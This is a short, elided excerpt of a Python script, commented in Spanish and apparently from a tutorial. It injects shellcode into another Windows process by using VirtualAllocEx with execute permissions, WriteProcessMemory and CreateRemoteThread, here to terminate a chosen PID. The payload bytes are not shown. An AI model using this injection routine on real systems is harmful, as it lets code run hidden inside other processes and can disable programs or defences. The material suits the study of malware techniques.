...
# Establecemos la mascara de acceso eXECUTE para que el shellcode sea ejecutado en el pedazo
# de memoria que hemos alocado
...
if not sys.argv[1] or not sys.argv[2]:
    print ("Inyector de codigo: ./code_injector.py <PID a inyectar> <PID a matar>")
    sys.exit(0)
...
# Alocamos espacio para el shellcode
arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size,VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)

# Escribimos el shellcode en memoria
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, byref(written))

# Creamos el thread remoto y apuntamos su rutina de entrada al comienzo del shellcode
thread_id = c_ulong(0)
if not kernel32.CreateRemoteThread(h_process,None,0,arg_address,None,0,byref(thread_id)):
    print("[*] No se pudo inyectar el shellcode para matar procesos. Saliendo...")
    sys.exit(0)

print ("[*] Remote thread creado con un TID de: 0x%08x" % thread_id.value)
print ("[*] El proceso %s debe haber terminado!" % pid_to_kill)